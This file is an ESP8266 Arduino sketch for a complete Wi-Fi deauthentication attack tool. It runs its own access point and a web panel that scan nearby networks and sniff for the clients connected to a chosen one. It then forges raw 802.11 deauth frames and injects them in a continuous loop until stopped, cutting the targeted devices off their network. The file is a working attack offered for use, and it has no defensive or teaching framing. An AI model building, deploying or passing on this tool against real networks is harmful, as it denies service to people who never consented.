#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// --- Pin Configuration ---
#define AUTONOMOUS_MODE_PIN D3 // GPIO0

// --- Data Structures for Packet Sniffing & Attack ---
// This is the MAC header for 802.11 frames
struct MacHeader {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t addr1[6]; // Receiver (Destination)
  uint8_t addr2[6]; // Transmitter (Source)
  uint8_t addr3[6]; // BSSID (AP MAC)
  uint8_t sequenceControl[2];
};

// This is the full structure for a deauthentication frame
struct DeauthFrame {
  MacHeader macHeader;
  uint8_t reasonCode[2]; // Reason for deauthentication
};

// --- Global Variables ---
const char* ssid = "Digital Bug";
const char* password = "deauther";
ESP8266WebServer server(80);
bool autonomousMode = false;
volatile bool stopProcess = false;

// --- Client Scanning Globals ---
#define MAX_CLIENTS 20
String foundClients[MAX_CLIENTS];
int clientCount = 0;
String targetBSSID = "";

// --- Helper Functions ---
String getEncryptionType(uint8_t type) {
  switch (type) {
    case ENC_TYPE_NONE: return "OPEN";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "WPA*";
    default: return "???";
  }
}

String macToString(const uint8_t* mac) {
  char buf[20];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// Helper to convert a MAC address String back to a byte array
void stringToMac(String macStr, uint8_t* mac) {
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void addClient(String mac) {
    if (clientCount >= MAX_CLIENTS) return;
    for (int i = 0; i < clientCount; i++) {
        if (foundClients[i] == mac) return;
    }
    foundClients[clientCount] = mac;
    clientCount++;
}

// --- The Core Packet Sniffer Callback ---
void snifferCallback(uint8_t *buffer, uint16_t length) {
  MacHeader *header = (MacHeader*)buffer;
  String addr1_str = macToString(header->addr1);
  String addr2_str = macToString(header->addr2);

  if (addr1_str == targetBSSID && addr2_str != "FF:FF:FF:FF:FF:FF") {
      addClient(addr2_str);
  }
  if (addr2_str == targetBSSID && addr1_str != "FF:FF:FF:FF:FF:FF") {
      addClient(addr1_str);
  }
}

// --- Attack Function ---
// This function crafts and sends a single deauthentication frame.
void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* client_mac) {
    DeauthFrame deauth;
    
    // Frame Control: 0xC0 = Deauthentication frame
    deauth.macHeader.frameControl[0] = 0xC0;
    deauth.macHeader.frameControl[1] = 0x00;
    
    // Duration: 314 microseconds
    deauth.macHeader.duration[0] = 0x3a;
    deauth.macHeader.duration[1] = 0x01;

    // Set addresses:
    // addr1 = Destination (the client)
    // addr2 = Source (the AP)
    // addr3 = BSSID (the AP)
    memcpy(deauth.macHeader.addr1, client_mac, 6);
    memcpy(deauth.macHeader.addr2, ap_mac, 6);
    memcpy(deauth.macHeader.addr3, ap_mac, 6);

    // Sequence control (can be 0)
    deauth.macHeader.sequenceControl[0] = 0x00;
    deauth.macHeader.sequenceControl[1] = 0x00;

    // Reason code: 7 = "Class 3 frame received from nonassociated STA"
    // This is a common reason code used in deauth attacks.
    deauth.reasonCode[0] = 0x07;
    deauth.reasonCode[1] = 0x00;

    // Inject the packet into the air!
    // The wifi_send_pkt_freedom function is a low-level SDK function that allows raw packet injection.
    wifi_send_pkt_freedom((uint8_t*)&deauth, sizeof(DeauthFrame), 0);
}


// --- Web Server Handlers ---
void handleRoot() {
  if (LittleFS.exists("/index.html")) {
    File file = LittleFS.open("/index.html", "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(404, "text/plain", "Error: index.html not found.");
  }
}

void handleScan() {
  Serial.println("[API] Received /scan request.");
  int n = WiFi.scanNetworks();
  String html = "";

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      String rssi_color = "text-green-300";
      if(WiFi.RSSI(i) < -70) rssi_color = "text-yellow-400";
      if(WiFi.RSSI(i) < -80) rssi_color = "text-red-400";
      
      String radioValue = WiFi.BSSIDstr(i) + "," + String(WiFi.channel(i));

      html += "<tr class='hover:bg-green-900 hover:bg-opacity-20 transition duration-200'>";
      html += "<td class='px-4 py-3 font-medium text-green-300'>" + WiFi.SSID(i) + "</td>";
      html += "<td class='px-4 py-3 text-green-500'>" + WiFi.BSSIDstr(i) + "</td>";
      html += "<td class='px-4 py-3 " + rssi_color + " font-semibold'>" + String(WiFi.RSSI(i)) + "</td>";
      html += "<td class='px-4 py-3 text-green-500'>" + String(WiFi.channel(i)) + "</td>";
      html += "<td class='px-4 py-3'><span class='";
      html += (WiFi.encryptionType(i) == ENC_TYPE_NONE ? "text-red-400" : "text-green-300");
      html += "'>";
      html += getEncryptionType(WiFi.encryptionType(i));
      html += "</span></td>";
      html += "<td class='px-4 py-3'><input type='radio' name='target_ap' class='form-radio h-4 w-4 bg-gray-900 border-green-700' value='" + radioValue + "'></td>";
      html += "</tr>";
    }
  } else {
      html = "<tr><td colspan='6' class='text-center px-4 py-3 text-gray-500'>No networks found.</td></tr>";
  }
  
  server.send(200, "text/html", html);
  Serial.println("[API] Scan results sent.");
}

void handleClientScan() {
    Serial.println("[API] Received /clients request.");
    if (!server.hasArg("target")) {
        server.send(400, "text/plain", "Bad Request: Missing target parameter.");
        return;
    }

    stopProcess = false;
    String target = server.arg("target");
    int commaIndex = target.indexOf(',');
    targetBSSID = target.substring(0, commaIndex);
    int channel = target.substring(commaIndex + 1).toInt();

    Serial.printf("[INFO] Starting client scan on channel %d for BSSID %s\n", channel, targetBSSID.c_str());

    clientCount = 0;
    wifi_set_channel(channel);
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(snifferCallback);

    unsigned long startTime = millis();
    while(millis() - startTime < 10000 && !stopProcess) {
        server.handleClient();
        delay(1); 
    }

    wifi_promiscuous_enable(0);
    
    if (stopProcess) {
        Serial.println("[INFO] Client scan stopped by user.");
    } else {
        Serial.printf("[INFO] Found %d clients.\n", clientCount);
    }

    String html = "";
    if (clientCount > 0) {
        for (int i = 0; i < clientCount; i++) {
            html += "<tr class='hover:bg-green-900 hover:bg-opacity-20 transition duration-200'>";
            html += "<td class='px-4 py-3 text-green-300'>" + foundClients[i] + "</td>";
            html += "<td class='px-4 py-3 text-green-500'>" + targetBSSID + "</td>";
            html += "<td class='px-4 py-3 text-green-500'>N/A</td>";
            html += "<td class='px-4 py-3'><input type='checkbox' name='target_client' class='form-checkbox h-4 w-4 bg-gray-900 border-green-700' value='" + foundClients[i] + "'></td>";
            html += "</tr>";
        }
    } else {
        html = "<tr><td colspan='4' class='text-center px-4 py-3 text-yellow-400'>No clients found for this AP.</td></tr>";
    }
    server.send(200, "text/html", html);
}

// *** NEW IMPLEMENTATION of handleAttack ***
void handleAttack() {
    Serial.println("[API] Received /attack request.");
    if (!server.hasArg("ap_bssid") || !server.hasArg("channel") || !server.hasArg("clients")) {
        server.send(400, "text/plain", "Bad Request: Missing parameters.");
        return;
    }

    stopProcess = false;
    int channel = server.arg("channel").toInt();
    String ap_bssid_str = server.arg("ap_bssid");
    String clients_str = server.arg("clients");

    // Convert MAC strings to byte arrays
    uint8_t ap_mac[6];
    stringToMac(ap_bssid_str, ap_mac);

    Serial.printf("[ATTACK] Starting Deauth Attack on channel %d, AP: %s\n", channel, ap_bssid_str.c_str());
    server.send(200, "text/plain", "OK. Attack started. Press STOP to end.");

    // Set the channel for the attack
    wifi_set_channel(channel);

    // Loop indefinitely, sending deauth packets until stopped
    while(!stopProcess) {
        // Loop through each client MAC address provided in the comma-separated list
        int currentPos = 0;
        while(currentPos < clients_str.length()) {
            int nextPos = clients_str.indexOf(',', currentPos);
            if (nextPos == -1) nextPos = clients_str.length();
            
            String client_mac_str = clients_str.substring(currentPos, nextPos);
            uint8_t client_mac[6];
            stringToMac(client_mac_str, client_mac);

            // Send a deauth frame from AP to Client
            sendDeauthFrame(ap_mac, client_mac);
            // Send another frame from Client to AP for good measure
            sendDeauthFrame(client_mac, ap_mac);
            
            currentPos = nextPos + 1;
        }
        
        // This is crucial to keep the web server responsive to a /stop request
        server.handleClient();
        delay(2); // A small delay to prevent overwhelming the ESP8266
    }

    Serial.println("[ATTACK] Deauth attack stopped by user.");
}


void handleStop() {
    Serial.println("[API] Received /stop request.");
    stopProcess = true;
    server.send(200, "text/plain", "OK. Process will be stopped.");
}

void handleNotFound() {
  server.send(404, "text/plain", "Not Found");
}

void runAutonomousMode() {
    Serial.println("\n[MODE] Autonomous Mode Active. Starting passive logging.");
    pinMode(LED_BUILTIN, OUTPUT);
    while(true) {
        digitalWrite(LED_BUILTIN, LOW);
        delay(100);
        digitalWrite(LED_BUILTIN, HIGH);
        delay(1900);
        Serial.print(".");
    }
}

void setup() {
  Serial.begin(115200);
  pinMode(AUTONOMOUS_MODE_PIN, INPUT_PULLUP);
  delay(100);

  if (digitalRead(AUTONOMOUS_MODE_PIN) == LOW) {
    autonomousMode = true;
    runAutonomousMode();
  }

  Serial.println("\n[MODE] Interactive Mode Active. Starting web server...");

  if (!LittleFS.begin()) {
    Serial.println("[ERROR] Failed to mount file system.");
    return;
  }
  Serial.println("[OK] File system mounted.");

  WiFi.softAP(ssid, password);
  Serial.print("[OK] Access Point '");
  Serial.print(ssid);
  Serial.println("' started.");
  Serial.print("[INFO] IP Address: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/clients", HTTP_GET, handleClientScan);

  // The attack handler now uses POST to send more data
  server.on("/attack", HTTP_POST, handleAttack);
  
  server.on("/stop", HTTP_GET, handleStop);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[OK] Web server started.");
}

void loop() {
  if (!autonomousMode) {
    server.handleClient();
  }
}
